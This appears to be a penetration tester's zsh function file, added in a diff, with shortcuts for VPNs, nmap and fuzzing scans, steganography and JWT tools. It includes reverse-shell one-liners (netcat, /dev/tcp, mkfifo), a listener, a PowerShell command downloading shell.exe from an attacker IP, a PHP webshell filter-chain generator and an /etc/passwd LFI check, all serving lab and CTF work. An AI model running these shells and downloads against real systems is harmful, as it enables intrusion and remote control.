@@ -1,0 +1,403 @@
+allcommands(){
+grep "()" .allCustomCommand
+}
+
+#Connect Office VPN
+office_vpn(){
+sudo openvpn /home/kali/Pentest/koushick@cyber-vpn.conf
+}
+#Connect Offsec VPN
+offsec-vpn(){
+sudo openvpn ~/OffSec/OSWA/universal.ovpn
+}
+
+# Password Manager
+password(){
+python $HOME/PassManager/passManager.py
+}
+
+#----------------------------------Linux System Related Aliases----------------------------#
+createUser(){
+sudo adduser $1 --shell /bin/zsh
+}
+rmUser(){
+sudo deluser --remove-home $1
+}
+
+
+hidden-files(){ # Display hidden files
+print "ls -ld .?*"
+}
+delete(){
+sudo rm -rf $1
+}
+empty-ghauri(){
+sudo rm -rf ~/.ghauri/*
+}
+empty-ssh(){
+echo "" > ~/.ssh/known_hosts
+}
+changeip(){
+sudo dhclient -r eth0
+sleep 10
+sudo dhclient -1 eth0
+}
+set-read(){
+sudo chmod 644 $1
+}
+show(){
+$HOME/System-Planner/System-Setup/CustomScripts/AutoRecon/showFile.sh $1
+}
+push(){
+FILE_PATH=/media/sf_All-Shared-Folder/System-Planner/System-Setup/.dotfiles/$1
+if [ -f "$FILE_PATH" ]; then # checking if the file exists in the destination folder
+	rm /media/sf_All-Shared-Folder/System-Planner/System-Setup/.dotfiles/$1
+	cp $HOME/.dotfiles/$1 /media/sf_All-Shared-Folder/System-Planner/System-Setup/.dotfiles/$1
+	source $HOME/.dotfiles/$1
+else
+	cp $HOME/.dotfiles/$1 /media/sf_All-Shared-Folder/System-Planner/System-Setup/.dotfiles/$1
+	source $HOME/.dotfiles/$1
+fi
+}
+
+pull()
+{
+rm ~/.dotfiles/$1
+cp /media/sf_All-Shared-Folder/System-Planner/System-Setup/.dotfiles/$1 $HOME/.dotfiles/$1
+chmod 644 $HOME/.dotfiles/$1
+source $HOME/.dotfiles/$1
+}
+# combine 2 files
+pcat(){ 
+python3 /home/kali/System-Planner/System-Setup/CustomScripts/pcat.py $1 $2 $3 $4
+}
+
+rar_extract(){
+sudo unrar e $1
+}
+cmkdir(){
+mkdir $1
+cd $1
+}
+webup(){
+ls
+echo ""
+echo "wget http://`ifconfig | grep 192.168.0.* | awk '{print $2}'`:8000/"
+python -m http.server
+}
+copy(){
+searchsploit -m $1
+}
+incomming_ping(){
+sudo tcpdump -ni $1 icmp
+}
+# Copy file via SSH
+scpd(){
+scp -r pentest@192.168.0.104:~/tools ~/tmp
+}
+updatedb(){
+sudo updatedb
+}
+# Navigate to PostExploitation
+postexp(){
+cd /home/kali/Organize/Platform/PostExploitation
+ls -l
+}
+
+
+#IP-PORT
+iport(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+echo $IP":"$PORT
+}
+# Reverse Shell
+rev-shell(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+echo "nc -e /bin/bash $IP $PORT"
+echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+echo "bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
+}
+# Listener
+lis(){
+echo "nc -nlvp $1"
+nc -nlvp $1
+}
+page(){
+mousepad $1&
+}
+his(){
+history | grep "$1"
+}
+
+find_word(){
+grep -Rnw '.' -e '$1'
+}
+
+#Display IPs
+loop(){
+ip addr | grep "scope host lo" |awk '{print "lo-"$2}'
+}
+eth0(){
+ip addr | grep "scope global dynamic" |awk '{print "eth0-"$2}'
+}
+tun0(){
+ip addr | grep "scope global tun0" |awk '{print "tun0-"$2}'
+}
+
+#Calling above functions
+ips(){
+loop
+eth0
+tun0
+}
+# View hidden files and folders
+# Files
+hiddenfiles(){
+#find /path/to/folder -type f -name ".*"
+find $1 -type f -name ".*"
+}
+hiddenfolders(){
+# Folders
+#find /path/to/folder -name ".*"
+find $1 -name ".*"
+}
+
+# .zsh_history file related
+his_file(){
+# sed tool to omit ": 1731477953:0;" from ": 1731477953:0;cat .zsh_history"
+sed 's/^: [0-9]*:[0-9]*;//' ~/.zsh_history 
+}
+
+# Copy files from romote to local machine using 'scp'
+transfer_file(){
+echo "scp username@remoteHost:/remote/dir/file.txt /local/dir/"
+echo "scp -r kali@192.168.0.103:offsec-exam offsec-exam"
+}
+
+python_virtual_env(){
+echo "
+Install python venv module first.
+python3 -m venv <foldername>
+source <foldername>/bin/activate
+To get out of the folder : deactivate
+"
+}
+
+
+#-------------Docker Related----------------#
+
+del-docker-containers()
+{
+sudo docker ps -a | awk '{print $1}' | grep -v 'CONTAINER' >  docker_containers.txt
+for containers in $(cat docker_containers.txt); do sudo docker rm $containers; done
+}
+
+
+
+#--------------Service Related--------------#
+startssh(){
+sudo service ssh start
+}
+startapache2(){
+sudo service apache2 start
+}
+statusapache2(){
+sudo service apache2 status
+}
+restartapache2(){
+sudo service apache2 restart
+}
+apache2log(){
+sudo tail /var/log/apache2/access.log
+}
+#Change java openJDK version
+change_java(){
+sudo update-alternatives --config java
+}
+#Python module upgrade
+py_module_upgrade(){
+echo "sudo pip3 install requests --upgrade"
+}
+update_tools(){
+sudo pip3 install --upgrade wfuzz
+}
+#Open Jxplorer for ldap enumeration
+openldap(){
+cd ~/jxplorer
+./jxplorer.sh&
+}
+
+#--------------Buffer Overflow--------------#
+pattern(){
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $1
+}
+poffset(){
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $1 -q $2
+}
+compile-gcc(){
+gcc $1 -o $2 -no-pie -z execstack -m32
+}
+
+#--------------Custom Scripts--------------#
+start-recon(){
+$HOME/System-Planner/System-Setup/CustomScripts/AutoRecon/enumerated_v1.1.sh
+}
+target-analysis(){
+$HOME/System-Planner/System-Setup/CustomScripts/AutoRecon/targetAnalysis.sh
+}
+htmlComments(){
+$HOME/System-Planner/System-Setup/CustomScripts/AutoRecon/htmlComments_v1.1.sh $1 $2
+}
+replace-string(){
+python $HOME/System-Planner/System-Setup/CustomScripts/replace.py $1 $2 $3
+}
+shellshock(){
+bash /home/kali/Organize/Platform/WebApp/shellshock.sh
+}
+#--------------CTF-------------#
+short_scan(){
+echo "--> sudo nmap -sV -Pn -p- $1 | tee short-scan.nmap.$2" > short-scan.nmap.$2
+sudo nmap -sV -Pn -p- $1 >> short-scan.nmap.$2
+}
+version-scan(){
+echo "sudo nmap -sC -sV -Pn -p $1 $2 | tee nmap.$3"
+sudo nmap -sC -sV -Pn -p $1 $2 | tee nmap.$3
+}
+detailed_scan(){
+echo "sudo nmap -sC -sV -Pn $1"
+sudo nmap -sC -sV -Pn $1
+}
+all_port_detailed_scan(){
+sudo nmap -sC -sV -Pn -p- $1
+}
+quick_scan(){
+sudo nmap -sV -Pn $1 -p- --min-rate=10000
+}
+script_scan(){
+sudo nmap --script vuln $1
+}
+gobuster_auto(){
+gobuster dir -u http://$1/ -w /usr/share/wordlists/dirb/common.txt
+}
+nikto_auto(){
+echo "nikto -host $1 | tee nikto.$2"
+nikto -host $1 | tee nikto.$2
+}
+quick_udpscan(){
+sudo nmap -sU -p- --min-rate 10000 $1
+}
+udp-scan()
+{
+sudo nmap -sC -sV -sU --top-ports=20 $1
+}
+
+# Stegnography
+stegnography(){
+echo "stegseek -sf $1 -wl ~/tools/rockyou.txt"
+echo "steghide extract -sf $1"
+echo "binwalk -e $1"
+}
+info-in-image(){
+steghide extract -sf $1
+}
+#SMTP user enumeration
+smtp4user(){
+smtp-user-enum -M VRFY -U ~/tools/SecLists/Usernames/Names/names.txt -t $1
+}
+
+
+
+#---------------------------------------Windows System Related---------------------------------------#
+
+powershell-download(){
+tar1=powershell
+tar2=" (New-Object System.Net.WebClient).Downloadfile('http://10.10.14.2:8000/shell.exe','shell.exe')"
+echo -e $tar1$tar2
+}
+
+#---------------------------------------Webapp System Related---------------------------------------#
+php-chain-generator(){
+python3 $HOME/System-Planner/System-Setup/CustomScripts/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system($_REQUEST["cmd"]); ?>' | xclip -selection clipboard
+}
+html(){
+lynx -dump $1
+}
+go_subdomain(){
+gobuster vhost -u $1 -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+}
+ffuf_subdomain(){
+# Not working properly
+# ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: # FUZZ.lambda.ctfio.com" -u https://lambda.ctfio.com/
+ffuf -u http://$1 -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$1 '$@'"
+ffuf -u http://cereal.ctf:44441 -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cereal.ctf:44441" -fs 15
+}
+# FFUF
+ffuf_dir(){
+ffuf -u "$1FUZZ" -w ~/tools/wordlist/directory-list-2.3-medium.txt -c
+}
+ffuf_files(){
+ffuf -u "$1FUZZ" -w ~/tools/wordlist/raft-medium-files-lowercase.txt -c
+}
+ffuf_extension(){
+ffuf -u "$1FUZZ" -w ~/tools/wordlist/directory-list-2.3-medium.txt -c -e .php,.txt
+}
+check_lfi(){
+ffuf -u "http://$1?FUZZ=/etc/passwd" -w ~/tools/wordlist/burp-parameter-names.txt -c -fs 0
+}
+# Status Code
+scode(){
+cat ~/Organize/Platform/Linux/status-code.txt | grep "$1"
+}
+
+# Crawl Website using Hakrawler
+crawl(){
+# echo "http://192.168.182.126/" | hakrawler -d 2 -u | grep -v -E "assets|.com"
+echo http://$1/ | hakrawler -d 2 -u | grep -v -E "$2|$3"
+}
+
+#--------------Encode - Decode--------------#
+
+urldecode(){
+echo ""
+python ~/Organize/Platform/WebApp/url-decode.py $1
+}
+urlencode(){
+python ~/Organize/Platform/WebApp/url-encode.py $1
+}
+decode(){
+echo "$1" | base64 -d
+}
+encode(){
+echo "$1" | base64
+}
+decodeall(){
+echo "Base64"
+echo -n "$1" | base64 -d
+echo ""
+echo "Base58"
+echo -n "$1" | base58 -d
+echo ""
+echo ""
+echo "Base32"
+echo -n "$1" | base32 -d
+}
+
+# For WebApps
+# All Fuzzers
+all-fuzzers(){
+print 'ffuf -u "http://$IP/FUZZ" -w ~/tools/SecLists/Fuzzing/XSS-Fuzzing -fs 0 -fc 404,403'
+echo 'wfuzz -c -z file,tools/SecLists/Fuzzing/XSS-Fuzzing --hh 40060 "http://offsecwp/?xss=FUZZ"'
+echo "gobuster dir -u http://$IP/ -w <wordlist_file>"
+}
+
+decode_jwt(){
+python ~/tools/jwt_tool/jwt_tool.py $1
+}
+tamper_jwt(){
+python ~/tools/jwt_tool/jwt_tool.py -T $1
+}
